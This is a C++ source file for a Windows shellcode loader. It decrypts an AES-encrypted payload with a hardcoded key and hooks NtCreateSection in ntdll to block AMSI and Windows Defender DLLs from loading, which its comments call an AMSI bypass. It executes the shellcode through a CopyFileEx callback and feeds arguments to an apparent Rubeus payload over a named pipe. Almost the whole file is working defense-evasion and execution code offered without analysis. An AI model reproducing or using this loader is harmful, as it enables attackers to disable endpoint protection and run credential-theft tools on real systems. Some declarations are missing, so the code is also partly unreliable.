#define _CRT_SECURE_NO_WARNINGS
#define _MT
#include <Windows.h>

#include <stdio.h>
#include <string.h>
#include <Wincrypt.h>
#include <time.h>
#include <process.h>
#include <tchar.h>
#include <psapi.h>
#include <ntstatus.h>
#include <winternl.h>
#include <iostream>
#include "sha256.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")



#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif



#define AES_KEY_SIZE 16
#define CHUNK_SIZE (AES_KEY_SIZE*5)
void* offset;
size_t size_offset;
#define extension ".inf"


char* encrypter_111(const char* path, BOOL isDecrypt, LPDWORD bytes, BOOL calculate) //Function to decypher shellcode files
{
	if (strlen(path) > MAX_PATH)
		return 0;
	char filename[266];
	char filename2[260 + 6];
	if (!isDecrypt) //This function is prepared to decrypt and also encrypt files
	{

		strcpy_s(filename, 266, path);
		strcpy_s(filename2, 266, path);
		strcat_s(filename2, 266, extension);

	}
	else
	{
		strcpy_s(filename, 266, path);
	}



	wchar_t default_key[] = L"7fwivcli7r#auzS"; //Key
	wchar_t* key_str = default_key;

	size_t len = lstrlenW(key_str); //keyLen


	HANDLE hInpFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL); //Open the file
	if (hInpFile == INVALID_HANDLE_VALUE) {

		return 0;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;

	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) { //Init cryptAPI
		dwStatus = GetLastError();
		return 0;
	}

	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { 
		dwStatus = GetLastError();

		return 0;
	}

	if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
		DWORD err = GetLastError();

		return 0;
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
		dwStatus = GetLastError();

		return 0;
	}


	const size_t chunk_size = CHUNK_SIZE;
	BYTE chunk[chunk_size] = { 0 };
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInpFile, NULL);
	*bytes = inputSize;
	if (calculate == TRUE) //If we use the function to calculate the size of the unencrypted shellcode
	{

		CryptReleaseContext(hProv, 0);
		CryptDestroyKey(hKey);
		CryptDestroyHash(hHash);
		CloseHandle(hInpFile);

		return 0;
	}

	char* buffer_alloc = (char*)malloc(inputSize + 1); //buffer for the unencrypted shellcode
	if (!buffer_alloc)
		return 0;
	int i = 0;
	while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) { //Read the file to the buffer_alloc
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize == inputSize) {
			isFinal = TRUE;
		}

		if (isDecrypt) {
			if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) { //If we are decrypting
				break;
			}
		}
		else {
			if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) { //If we are encrypting
				break;
			}
		}
		DWORD written = 0;

		if (i != 0)
			memcpy(buffer_alloc + 80 * i, chunk, out_len); //Workaround for the size issues
		else
		{
			memcpy(buffer_alloc, chunk, out_len);

		}
		i++;


		memset(chunk, 0, chunk_size);
	}
	*bytes = inputSize; //variable with the size of the shellcode
	CryptReleaseContext(hProv, 0); //Close handles
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);
	CloseHandle(hInpFile);



	return buffer_alloc; //return the shellcode

}










char tramp_ntcreatesection[13] = {
	0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
	0x41, 0xFF, 0xE2                                                    // jmp r10
};
char tramp_old_ntcreatesection[13];






std::string data_hash[] =
{
	"fbd13447dcd3ab91bb0d2324e11eca986967c99dcd324b00f9577010c6080413", //SHA256 of the UNC Path of the AMSI dll and other Windows Defender injected DLLs
	"856efe1b2c5b5716b4d373bb7205e742da90d51256371c582ce82b353d900186",
	"d8d52609d0c81d70bf44cb3cd5732a1c232cc20c25342d0a118192e652a12d98",
	"a75589e0d1b5b8f0ad28f508ed28df1b4406374ac489121c895170475fe3ef74"


}; //array with the file hashes




NTSTATUS ntCreateMySection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL) /*Bypass AMSI*/
{
	int isFinal = 0;
	char lpFilename[256];
	if (FileHandle != NULL)
	{

		DWORD res = GetFinalPathNameByHandleA(FileHandle, lpFilename, 256, FILE_NAME_OPENED | VOLUME_NAME_DOS); //Get the file path of the file handle
		if (res == 0)
			printf("GetFinalPathNameByHandleA error: %d\n", GetLastError());

		else
		{
			std::string hash = sha256(std::string(lpFilename)); //Compute the SHA256 hash of the file path (only the hash of the name, not the file)
			unsigned int arrSize = sizeof(data_hash) / sizeof(data_hash[0]); //Get the size of the array
			for (int counter = 0; counter < arrSize; counter++) //Loop each position of the array
			{
				if (hash.compare(data_hash[counter]) == 0) //If hash of the DLL to load is equal to any of the array hashes return 0
				{
					return -1;
				}
			}
		}
	}
	restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle); //If it's not an AMSI DLL restore the original NtCreateSection
	return 1;
}



BOOL restore_hook_ntcreatesection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL)
{
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId()); //Open current process
	myNtCreateSection NtCreate;
	NtCreate = (myNtCreateSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtCreateSection"); //Get address of the hooked NtCreateSection
	DWORD written2, written3;


	VirtualProtect(NtCreate, sizeof NtCreate, PAGE_EXECUTE_READWRITE, &written2); //Protect it 
	VirtualProtect(tramp_old_ntcreatesection, sizeof tramp_old_ntcreatesection, PAGE_EXECUTE_READWRITE, &written3);

	if (!WriteProcessMemory(hProc, NtCreate, &tramp_old_ntcreatesection, sizeof tramp_old_ntcreatesection, NULL)) //Write the real NtCreateSection in the address of the hook
	{
		return FALSE;
	}
	NtCreate(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle); //Call the real NtCreateSection
	hook_ntcreatesection(hProc); //hook it again
	return 1;

}


BOOL hook_ntcreatesection(HANDLE hProc)
{
	myNtCreateSection NtCreate;
	NtCreate = (myNtCreateSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtCreateSection"); //GetProcAddress of NtCreateSection
	if (!NtCreate)
		exit(-1);
	DWORD written3;


	VirtualProtect(NtCreate, sizeof NtCreate, PAGE_EXECUTE_READWRITE, &written3); //Protect it 

	void* reference = (void*)ntCreateMySection; //pointer to ntCreateSection  (hook) in reference


	memcpy(tramp_old_ntcreatesection, NtCreate, sizeof tramp_old_ntcreatesection); //Copy the syscall of NtCreateSection (real) in a global variable
	memcpy(&tramp_ntcreatesection[2], &reference, sizeof reference); //Copy  the hook to tramp_ntcreatesection

	DWORD old3;

	VirtualProtect(tramp_ntcreatesection, sizeof tramp_ntcreatesection, PAGE_EXECUTE_READWRITE, &old3);


	if (!WriteProcessMemory(hProc, (LPVOID*)NtCreate, &tramp_ntcreatesection, sizeof tramp_ntcreatesection, NULL)) //Write the hook to the address of the NtCreateSection
	{
		return -1;
	}
	return 1;
}


typedef struct args {
	char** args;
	int length;
} arguments;//Struct


void manage_pipes(arguments *parameters)
{
	DWORD outputBufferSize = 2056;
	HANDLE  pipeBool = CreateNamedPipe("\\\\.\\pipe\\testpipe",
		PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE | WRITE_DAC,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		outputBufferSize,
		outputBufferSize,
		0,
		NULL
	); //Pipe for the rubeus arguments
	if (pipeBool == INVALID_HANDLE_VALUE)
	{
		return;
	}

	BOOL isConnected = ConnectNamedPipe(pipeBool, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED); //Connect to the Pipe
	if (isConnected) //Write to the pipe the arguments
	{
		int argc = parameters->length;
		char** argv = (char**)parameters->args;
		DWORD* bytes_written = new DWORD[argc];
		for (int args = 1; args < argc; args++)
		{
			WriteFile(pipeBool, argv[args], strlen(argv[args]), &bytes_written[args], NULL);
		}
	}
	CloseHandle(pipeBool);
}



int main(int argc, char **argv) 
{
	

		arguments* __arguments = (arguments*)malloc(sizeof(arguments)); //Allocate space for the structure of arguments
		__arguments->args = argv; //arguments 
		__arguments->length = argc; //number of arguments
		static DWORD size = NULL;
		encrypter_111("deletefile.txt", true, &size, true); //get the size of the unencrypted shellcode
		char* shellcode = (char*)malloc(size); //allocate space for the unencrypted shellcode
		memcpy(shellcode, encrypter_111("deletefile.txt", true, &size, false), size); //copy the shellcode to the allocated array
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId()); //Open the current process
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)manage_pipes, (LPVOID)__arguments, 0, nullptr); //Create the thread for the pipe
		if (hThread == NULL)
		{
			free(shellcode);
			free(__arguments);
			return -1;
		}


		hook_ntcreatesection(hProc); //Hook the NtCreateSection
		DWORD old; //Old protection
		if (!VirtualProtect(shellcode, size, PAGE_EXECUTE_READWRITE, &old)) //Protect the shellcode array with PAGE_EXECUTE_READWRITE
			return 0;
		if (!CopyFileEx("deletefile.txt", "deletefile", (LPPROGRESS_ROUTINE)shellcode, NULL, FALSE, 0)) //Trigger the shellcode (callback)
			printf("%d\n", GetLastError());
		WaitForSingleObject(hThread, INFINITE); 
		free(__arguments);
		free(shellcode);
	
		return 0;

}